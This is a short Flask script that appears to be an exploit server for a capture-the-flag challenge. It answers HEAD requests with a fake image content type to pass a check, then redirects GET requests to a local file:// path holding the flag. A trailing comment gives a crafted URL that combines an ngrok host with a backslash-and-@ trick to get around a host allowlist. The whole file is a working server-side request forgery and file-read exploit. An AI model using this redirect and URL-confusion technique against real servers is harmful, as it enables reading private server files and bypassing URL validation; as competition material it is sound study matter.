from flask import Flask, redirect, Response

app = Flask(__name__)


@app.route("/<path:path>", methods=["HEAD"])
def head_request(path):
    resp = Response("")
    resp.headers['Content-Type'] = 'image/fake'
    return resp


@app.route("/<path:path>", methods=["GET"])
def get_request(path):
    return redirect("file:///usr/src/app/fl4gg_tetCTF#lol.jpg", code=302)


# http://46f8-108-53-180-110.ngrok.io\\@i.ibb.co/#b\\a.jpg